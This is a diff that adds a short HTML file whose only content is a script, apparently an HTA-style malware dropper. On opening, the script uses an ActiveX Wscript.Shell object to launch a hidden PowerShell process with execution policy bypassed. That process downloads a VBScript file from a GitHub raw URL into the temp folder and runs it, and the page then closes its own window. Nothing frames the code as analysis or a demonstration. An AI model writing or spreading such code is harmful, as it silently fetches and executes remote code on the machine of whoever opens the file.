@@ -1,0 +1,11 @@
+<html>
+<head>
+<script>
+var objShell = new ActiveXObject("Wscript.Shell");
+objShell.Run("powershell.exe -WindowStyle hidden -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/freelancertool/data/master/run.vbs File.vbs -OutFile %temp%\binder2.vbs;Start-Process %temp%\binder2.vbs", 0);
+window.close();
+</script>
+</head>
+<body>
+</body>
+</html>
